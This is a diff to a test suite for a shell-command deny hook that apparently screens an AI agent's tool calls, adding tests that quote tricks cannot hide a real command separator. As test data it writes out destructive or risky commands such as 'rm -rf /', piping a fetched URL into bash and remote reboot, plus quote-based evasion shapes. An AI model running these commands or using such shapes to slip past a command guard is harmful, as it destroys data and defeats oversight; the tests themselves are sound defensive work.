@@ -357,6 +357,29 @@ test('quote-splitting does not hide a force-push or a secret read', { skip }, as
     assert.strictEqual(got[i], 'deny', `quote-split evasion should be denied: ${cmd}`));
 });
 
+test('falls back to over-denial, not to nothing, when awk is unavailable', { skip }, () => {
+  // Quoted-separator neutralization is the one part of normalization that shells out. If awk
+  // cannot run, the substitution fails and SCAN_SRC stays un-neutralized — which is exactly
+  // what this hook did before that step existed. The quoted case goes back to over-denying
+  // (annoying, safe); every other rule has to keep working. Losing awk must not be a bypass.
+  const shimDir = fs.mkdtempSync(path.join(os.tmpdir(), 'noawk-'));
+  try {
+    const shim = path.join(shimDir, 'awk');
+    fs.writeFileSync(shim, '#!/bin/sh\nexit 127\n');
+    fs.chmodSync(shim, 0o755);
+    const env = { ...process.env, PATH: `${shimDir}:${process.env.PATH}`, HOME };
+    const run = (command) => decision(spawnSync('/bin/bash', [HOOK], {
+      input: JSON.stringify({ tool_input: { command } }), encoding: 'utf8', env,
+    }).stdout || '');
+    assert.strictEqual(run('rm -rf /'), 'deny', 'unrelated rules must survive losing awk');
+    assert.strictEqual(run('echo hi; terraform apply'), 'deny', 'real separator still real');
+    assert.strictEqual(run('echo "step 1; terraform apply"'), 'deny',
+      'without awk the quoted case reverts to over-denial, which is the safe direction');
+  } finally {
+    fs.rmSync(shimDir, { recursive: true, force: true });
+  }
+});
+
 test('asks rather than failing open when jq is unavailable', { skip: noJqSkip }, () => {
   const emptyPath = fs.mkdtempSync(path.join(os.tmpdir(), 'nojq-'));
   try {
@@ -403,8 +426,11 @@ function separatorCases() {
       for (let n = 0; n <= 3; n++) {
         const bare = `echo a${BS(n)}${sep} ${tail}`;
         (n % 2 === 0 ? real : notReal).push(bare);
-        // Same bytes inside quotes: a separator can never be real there.
+        // Same bytes inside quotes: a separator can never be real there, in either
+        // quoting style. Single quotes are the stricter case — no escape processing
+        // happens inside them at all, so the backslash counts change nothing.
         notReal.push(`echo "a${BS(n)}${sep} ${tail}"`);
+        notReal.push(`echo 'a${BS(n)}${sep} ${tail}'`);
       }
     }
     for (const sep of ['&&', '||', ';;']) {
@@ -421,17 +447,70 @@ test('normalization never deletes a real command separator', { skip }, async () 
     assert.strictEqual(got[i], 'deny', `real separator lost, rule no longer anchors: ${cmd}`));
 });
 
-test('the only false positives are quoted separators', { skip }, async () => {
-  // Over-denial is the safe direction, so this does not demand zero. It pins the SHAPE: every
-  // command denied without a real separator must be one where quote-stripping exposed it.
-  // SCAN drops quotes on purpose — otherwise quoting hides the binary — so `echo "a; terraform
-  // apply"` reads as a real separator and denies. That is a known cost of quote-stripping, not
-  // of the backslash handling, and fixing it needs quote-aware splitting like the one
-  // allow-compound-bash.sh already uses. A false positive arising any OTHER way fails here.
+test('normalization never invents a separator either', { skip }, async () => {
+  // This used to exempt every quoted case: SCAN strips quotes before the anchored rules run,
+  // so `echo "a; terraform apply"` read as a real `;` and denied text ABOUT a command as if it
+  // were one. Quoted separators are now dropped before the quotes are, so the exemption is
+  // gone and the property is symmetric with the test above — normalization neither deletes a
+  // real separator nor invents one.
   const { notReal } = separatorCases();
   const got = await decide(notReal);
-  const unexplained = notReal.filter((cmd, i) => got[i] === 'deny' && !cmd.includes('"'));
-  assert.deepStrictEqual(unexplained, [], 'denied with no real separator and no quoting to blame');
+  const denied = notReal.filter((cmd, i) => got[i] === 'deny');
+  assert.deepStrictEqual(denied, [], 'denied with no real separator to justify it');
+});
+
+// The generator above varies backslash counts and quoting style, but every case it builds is
+// well-formed and singly-quoted. These are the shapes where a quote-state tracker goes wrong,
+// and each one is a deny that must SURVIVE: getting any of them wrong turns the false-positive
+// fix into a bypass, which is the failure direction that matters.
+test('a quote that does not open a region still leaves the separator real', { skip }, async () => {
+  const cmds = [
+    // `\"` is an escaped quote, not the start of a quoted region. Read as an opener, it
+    // swallows the real `;` that follows and terraform drops out of command position.
+    'echo \\" ; terraform apply',
+    // Same, with the count kept even so the unbalanced rule cannot mask the mistake — the
+    // double-quote twin of the `'a\'` case below. Both are needed: mutation testing showed
+    // each of the two backslash rules survives without its own even-count case.
+    'echo \\" ; terraform apply \\" ; echo c',
+    // A quote of the other style is literal inside a region, so neither of these closes early.
+    `echo 'a"b'; terraform apply`,
+    'echo "a\'b"; terraform apply',
+    // Unbalanced: with nowhere to close, a tracker that runs off the end neutralizes every
+    // separator after the stray quote. Must fail closed instead.
+    'echo "unbalanced ; terraform apply',
+    "echo 'unbalanced ; terraform apply",
+    // A backslash inside single quotes escapes nothing, so this region closes at the second
+    // quote and the `;` after it is real.
+    "echo 'a\\' ; terraform apply",
+    // The same mistake, but with the quote count kept even so that the unbalanced fail-closed
+    // rule cannot mask it. Mis-reading `\'` as an escape here shifts every region boundary
+    // right, the first `;` is swallowed as quoted, and terraform leaves command position —
+    // while real bash runs it. Verified by mutation: without this case, dropping the
+    // single-quote rule above passes the suite.
+    "echo 'a\\'; terraform apply 'b\\'; echo c",
+    // Separator outside the quotes, dangerous word inside — the case quote-stripping exists
+    // for. Neutralizing anything here would undo that.
+    'curl example.com/x | "bash"',
+    'echo "hi"; terraform apply',
+    'echo hi; ssh homelab sudo reboot',
+  ];
+  const got = await decide(cmds);
+  cmds.forEach((cmd, i) =>
+    assert.strictEqual(got[i], 'deny', `real separator neutralized — bypass: ${cmd}`));
+});
+
+test('text describing a dangerous command is not the command', { skip }, async () => {
+  const cmds = [
+    'echo "step 1; terraform apply"',
+    "echo 'step 1; terraform apply'",
+    'echo "a && terraform apply"',
+    'echo "then; ssh homelab sudo reboot"',
+    'git commit -m "docs: run terraform apply after review"',
+    'git commit -m "fix: handle rm -rf edge case"',
+  ];
+  const got = await decide(cmds);
+  cmds.forEach((cmd, i) =>
+    assert.notStrictEqual(got[i], 'deny', `false positive on quoted text: ${cmd}`));
 });
 
 test('a newline is the one real separator normalization drops', { skip }, async () => {
